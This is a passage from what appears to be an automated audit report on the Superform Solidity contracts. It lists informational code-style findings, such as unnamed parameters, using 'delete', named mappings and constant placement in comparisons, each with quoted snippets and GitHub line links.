[99-108](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol#L99-L108), [130-141](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol#L130-L141), [171-182](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol#L171-L182)

```solidity
File: superform-core/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol

/// @audit  parameter 1, parameter 2,
128:     function estimateFees(
129:             bytes memory, /*message_*/
130:             bytes memory /*extraData_*/
131:         )
132:             external
133:             view
134:             override
135:             returns (uint256 fees)
136:         {

/// @audit  parameter 1, parameter 3,
145:     function broadcastPayload(
146:             address, /*srcSender_*/
147:             bytes memory message_,
148:             bytes memory /*extraData_*/
149:         )
150:             external
151:             payable
152:             virtual
153:             onlyValidStateRegistry
154:         {

```

[128-136](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L128-L136), [145-154](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L145-L154)

```solidity
File: superform-core/src/crosschain-liquidity/socket/SocketOneInchValidator.sol

/// @audit  parameter 2,
52:     function decodeAmountIn(
53:            bytes calldata txData_,
54:            bool /*genericSwapDisallowed_*/
55:        )
56:            external
57:            pure
58:            override
59:            returns (uint256 amount_)
60:        {

```

[52-60](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/socket/SocketOneInchValidator.sol#L52-L60)

```solidity
File: superform-core/src/crosschain-liquidity/socket/SocketValidator.sol

/// @audit  parameter 2,
75:     function decodeAmountIn(
76:            bytes calldata txData_,
77:            bool /*genericSwapDisallowed_*/
78:        )
79:            external
80:            pure
81:            override
82:            returns (uint256 amount_)
83:        {

/// @audit  parameter 1,
88:     function decodeDstSwap(bytes calldata /*txData_*/ )
89:            external
90:            pure
91:            override
92:            returns (address, /*token_*/ uint256 /*amount_*/ )
93:        {

/// @audit  parameter 1,
97:     function decodeSwapOutputToken(bytes calldata /*txData_*/ ) external pure override returns (address /*token_*/ ) {

```

[75-83](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/socket/SocketValidator.sol#L75-L83), [88-93](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/socket/SocketValidator.sol#L88-L93), [97](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/socket/SocketValidator.sol#L97)

```solidity
File: superform-core/src/forms/ERC4626Form.sol

/// @audit  parameter 2,
28:     function _directDepositIntoVault(
29:            InitSingleVaultData memory singleVaultData_,
30:            address /*srcSender_*/
31:        )
32:            internal
33:            override
34:            returns (uint256 dstAmount)
35:        {

/// @audit  parameter 2,
40:     function _xChainDepositIntoVault(
41:            InitSingleVaultData memory singleVaultData_,
42:            address,
43:            uint64 srcChainId_
44:        )
45:            internal
46:            override
47:            returns (uint256 dstAmount)
48:        {

/// @audit  parameter 1,
78:     function _emergencyWithdraw(address, /*srcSender_*/ address refundAddress_, uint256 amount_) internal override {

```

[28-35](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626Form.sol#L28-L35), [40-48](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626Form.sol#L40-L48), [78](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626Form.sol#L78)

```solidity
File: superform-core/src/forms/ERC4626FormImplementation.sol

/// @audit  parameter 2,
333:     function _processXChainWithdraw(
334:             InitSingleVaultData memory singleVaultData_,
335:             address, /*srcSender_*/
336:             uint64 srcChainId_
337:         )
338:             internal
339:             returns (uint256 dstAmount)
340:         {

```

[333-340](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626FormImplementation.sol#L333-L340)

```solidity
File: superform-core/src/forms/ERC4626KYCDaoForm.sol

/// @audit  parameter 1, parameter 2, parameter 3,
56:     function _xChainDepositIntoVault(
57:            InitSingleVaultData memory, /*singleVaultData_*/
58:            address, /*srcSender_*/
59:            uint64 /*srcChainId_*/
60:        )
61:            internal
62:            pure
63:            override
64:            returns (uint256 /*dstAmount*/ )
65:        {

/// @audit  parameter 1, parameter 2, parameter 3,
83:     function _xChainWithdrawFromVault(
84:            InitSingleVaultData memory, /*singleVaultData_*/
85:            address, /*srcSender_*/
86:            uint64 /*srcChainId_*/
87:        )
88:            internal
89:            pure
90:            override
91:            returns (uint256 /*dstAmount*/ )
92:        {

```

[56-65](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626KYCDaoForm.sol#L56-L65), [83-92](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626KYCDaoForm.sol#L83-L92)

```solidity
File: superform-core/src/forms/ERC4626TimelockForm.sol

/// @audit  parameter 2,
133:     function _directDepositIntoVault(
134:             InitSingleVaultData memory singleVaultData_,
135:             address /*srcSender_*/
136:         )
137:             internal
138:             virtual
139:             override
140:             returns (uint256 dstAmount)
141:         {

/// @audit  parameter 2,
146:     function _xChainDepositIntoVault(
147:             InitSingleVaultData memory singleVaultData_,
148:             address,
149:             uint64 srcChainId_
150:         )
151:             internal
152:             virtual
153:             override
154:             returns (uint256 dstAmount)
155:         {

/// @audit  parameter 1,
201:     function _emergencyWithdraw(address, /*srcSender_*/ address refundAddress_, uint256 amount_) internal override {

```

[133-141](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626TimelockForm.sol#L133-L141), [146-155](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626TimelockForm.sol#L146-L155), [201](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626TimelockForm.sol#L201)



### Consider using `delete` rather than assigning zero to clear values

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

The `delete` keyword more closely matches the semantics of what is being done, and draws more attention to the changing of state, which may lead to a more thorough audit of its associated logic.

*Instances (6)*:

```solidity
File: superform-core/src/BaseRouterImplementation.sol

671:                 v.dstAmounts[i] = 0;

```

[671](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L671)

```solidity
File: superform-core/src/crosschain-data/extensions/CoreStateRegistry.sol

272:         failedDeposits[payloadId_].lastProposedTimestamp = 0;

294:         failedDeposits_.lastProposedTimestamp = 0;

728:                 multiVaultData.amounts[i] = 0;

799:                             multiVaultData.amounts[i] = 0;

813:                         multiVaultData.amounts[i] = 0;

```

[272](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L272), [294](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L294), [728](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L728), [799](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L799), [813](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L813)




###  Consider using named mappings

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Consider moving to solidity version 0.8.18 or later, and using [named mappings](https://ethereum.stackexchange.com/a/145555) to make it easier to understand the purpose of each mapping

*Instances (34)*:

```solidity
File: ERC1155A/src/ERC1155A.sol

27:     mapping(uint256 => uint256) public _totalSupply;

33:     mapping(address => mapping(uint256 => uint256)) public balanceOf;

33:     mapping(address => mapping(uint256 => uint256)) public balanceOf;

36:     mapping(address => mapping(address => bool)) public isApprovedForAll;

36:     mapping(address => mapping(address => bool)) public isApprovedForAll;

```

[27](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L27), [33](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L33), [33](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L33), [36](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L36), [36](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L36)

```solidity
File: superform-core/src/crosschain-data/BaseStateRegistry.sol

36:     mapping(uint256 => bytes) public payloadBody;

39:     mapping(uint256 => uint256) public payloadHeader;

42:     mapping(bytes32 => uint256) public messageQuorum;

45:     mapping(uint256 => PayloadState) public payloadTracking;

48:     mapping(uint256 => uint8[]) internal msgAMBs;

```

[36](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BaseStateRegistry.sol#L36), [39](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BaseStateRegistry.sol#L39), [42](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BaseStateRegistry.sol#L42), [45](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BaseStateRegistry.sol#L45), [48](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BaseStateRegistry.sol#L48)

```solidity
File: superform-core/src/crosschain-data/BroadcastRegistry.sol

35:     mapping(uint256 => bytes) public payload;

38:     mapping(uint256 => uint64) public srcChainId;

41:     mapping(uint256 => PayloadState) public payloadTracking;

```

[35](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BroadcastRegistry.sol#L35), [38](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BroadcastRegistry.sol#L38), [41](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BroadcastRegistry.sol#L41)

```solidity
File: superform-core/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol

35:     mapping(uint64 => uint32) public ambChainId;

36:     mapping(uint32 => uint64) public superChainId;

37:     mapping(uint32 => address) public authorizedImpl;

38:     mapping(bytes32 => bool) public processedMessages;

```

[35](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol#L35), [36](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol#L36), [37](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol#L37), [38](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol#L38)

```solidity
File: superform-core/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol

34:     mapping(uint16 => mapping(uint64 => bool)) public isValid;

34:     mapping(uint16 => mapping(uint64 => bool)) public isValid;

35:     mapping(uint64 => uint16) public ambChainId;

36:     mapping(uint16 => uint64) public superChainId;

37:     mapping(uint16 => bytes) public trustedRemoteLookup;

38:     mapping(uint16 => mapping(bytes => mapping(uint64 => bytes32))) public failedMessages;

38:     mapping(uint16 => mapping(bytes => mapping(uint64 => bytes32))) public failedMessages;

38:     mapping(uint16 => mapping(bytes => mapping(uint64 => bytes32))) public failedMessages;

```

[34](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L34), [34](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L34), [35](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L35), [36](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L36), [37](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L37), [38](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L38), [38](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L38), [38](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L38)

```solidity
File: superform-core/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol

34:     mapping(uint64 => uint16) public ambChainId;

35:     mapping(uint16 => uint64) public superChainId;

36:     mapping(uint16 => address) public authorizedImpl;

37:     mapping(bytes32 => bool) public processedMessages;

```

[34](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol#L34), [35](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol#L35), [36](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol#L36), [37](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol#L37)

```solidity
File: superform-core/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol

36:     mapping(uint64 => uint16) public ambChainId;

37:     mapping(uint16 => uint64) public superChainId;

38:     mapping(uint16 => address) public authorizedImpl;

39:     mapping(bytes32 => bool) public processedMessages;

```

[36](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L36), [37](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L37), [38](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L38), [39](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L39)

```solidity
File: superform-core/src/payments/PayMaster.sol

26:     mapping(address => uint256) public totalFeesPaid;

```

[26](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PayMaster.sol#L26)




### Constants in comparisons should appear on the left side

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Doing so will prevent [typo bugs](https://www.moserware.com/2008/01/constants-on-left-are-better-but-this.html).

*Instances (154)*:

```solidity
File: ERC1155A/src/ERC1155A.sol

/// @audit == 0
260:         if (_totalSupply[id] == 0) revert ID_NOT_MINTED_YET();

/// @audit > 0
355:         return _totalSupply[id] > 0;

/// @audit == 0x01ffc9a7
369:         return interfaceId == 0x01ffc9a7 // ERC165 Interface ID for ERC165

/// @audit == 0xd9b67a26
370:             || interfaceId == 0xd9b67a26 // ERC165 Interface ID for ERC1155

/// @audit == 0x0e89341c
371:             || interfaceId == 0x0e89341c; // ERC165 Interface ID for ERC1155MetadataURI

/// @audit > 0
543:         if (to.code.length > 0) {

/// @audit == 0
550:                 if (reason.length == 0) {

/// @audit > 0
577:         if (to.code.length > 0) {

/// @audit == 0
585:                 if (reason.length == 0) {

```

[260](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L260), [355](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L355), [369](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L369), [370](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L370), [371](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L371), [543](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L543), [550](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L550), [577](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L577), [585](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L585)

```solidity
File: superform-core/src/BaseRouterImplementation.sol

/// @audit != 0
624:         if (dstAmount != 0 && !vaultData_.retain4626) {

/// @audit != 0
670:             if (v.dstAmounts[i] != 0 && vaultData_.retain4626s[i]) {

/// @audit > 10_000
789:         if (maxSlippage_ > 10_000) return false;

/// @audit == 0
792:         if (amount_ == 0) return false;

/// @audit == 0
824:         if (len == 0 || liqRequestsLen == 0) return false;

/// @audit == 0
824:         if (len == 0 || liqRequestsLen == 0) return false;

/// @audit != 0
867:         if (residualPayment != 0) {

/// @audit != 0
894:         if (v.txDataLength != 0) {

/// @audit == 0
903:             if (v.txDataLength == 0) {

/// @audit != 0
910:             if (permit2data_.length != 0) {

/// @audit != 0
974:             if (vaultData_.liqData[i].txData.length != 0) {

/// @audit == 0
995:                 if (txDataLength == 0 && !xChain) {

/// @audit == 0
997:                 } else if (txDataLength == 0 && xChain) {

/// @audit == 0
1006:             if (v.totalAmount == 0) {

/// @audit != 0
1010:             if (v.permit2dataLen != 0) {

```

[624](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L624), [670](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L670), [789](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L789), [792](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L792), [824](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L824), [824](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L824), [867](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L867), [894](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L894), [903](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L903), [910](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L910), [974](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L974), [995](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L995), [997](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L997), [1006](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L1006), [1010](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L1010)

```solidity
File: superform-core/src/EmergencyQueue.sol

/// @audit == 0
120:         if (data.superformId == 0) revert Error.EMERGENCY_WITHDRAW_NOT_QUEUED();

```

[120](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/EmergencyQueue.sol#L120)

```solidity
File: superform-core/src/SuperformFactory.sol

/// @audit != 0
212:         if (vaultFormImplCombinationToSuperforms[vaultFormImplementationCombination] != 0) {

/// @audit != 0
253:         if (extraData_.length != 0) {

```

[212](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperformFactory.sol#L212), [253](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperformFactory.sol#L253)

```solidity
File: superform-core/src/crosschain-data/BaseStateRegistry.sol

/// @audit == 32
115:         if (data.params.length == 32) {

/// @audit == 0
150:         if (len == 0) {

/// @audit > 1
168:         if (len > 1) {

/// @audit != 0
177:                 if (i - 1 != 0 && ambIds_[i] <= ambIds_[i - 1]) {

```

[115](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BaseStateRegistry.sol#L115), [150](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BaseStateRegistry.sol#L150), [168](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BaseStateRegistry.sol#L168), [177](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BaseStateRegistry.sol#L177)

```solidity
File: superform-core/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol

/// @audit == 0
112:         if (domain == 0) {

/// @audit == 0
156:         if (superChainId_ == 0 || ambChainId_ == 0) {

/// @audit == 0
156:         if (superChainId_ == 0 || ambChainId_ == 0) {

/// @audit != 0
164:         if (oldSuperChainId != 0) {

/// @audit != 0
168:         if (oldAmbChainId != 0) {

/// @audit == 0
183:         if (domain_ == 0) {

/// @audit != 0
242:         if (extraData_.length != 0) {

```

[112](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol#L112), [156](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol#L156), [156](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol#L156), [164](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol#L164), [168](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol#L168), [183](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol#L183), [242](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol#L242)

```solidity
File: superform-core/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol

/// @audit == 0
175:         if (chainId == 0) {

/// @audit == 0
212:         if (superChainId_ == 0 || ambChainId_ == 0) {

/// @audit == 0
212:         if (superChainId_ == 0 || ambChainId_ == 0) {

/// @audit != 0
220:         if (oldSuperChainId != 0) {

/// @audit != 0
224:         if (oldAmbChainId != 0) {

/// @audit != 0
256:                     && trustedRemote.length != 0

/// @audit == 0
328:         if (trustedRemote.length == 0) {

```

[175](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L175), [212](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L212), [212](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L212), [220](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L220), [224](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L224), [256](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L256), [328](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L328)

```solidity
File: superform-core/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol

/// @audit != 0
112:         if (extraData_.length != 0) {

/// @audit == 0
118:         if (dstChainId == 0) {

/// @audit == 0
209:         if (superChainId_ == 0 || ambChainId_ == 0) {

/// @audit == 0
209:         if (superChainId_ == 0 || ambChainId_ == 0) {

/// @audit != 0
217:         if (oldSuperChainId != 0) {

/// @audit != 0
221:         if (oldAmbChainId != 0) {

/// @audit == 0
236:         if (chainId_ == 0) {

```

[112](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol#L112), [118](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol#L118), [209](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol#L209), [209](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol#L209), [217](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol#L217), [221](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol#L221), [236](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol#L236)

```solidity
File: superform-core/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol

/// @audit == 0
115:         if (finality_ == 0) {

/// @audit == 0
218:         if (superChainId_ == 0 || ambChainId_ == 0) {

/// @audit == 0
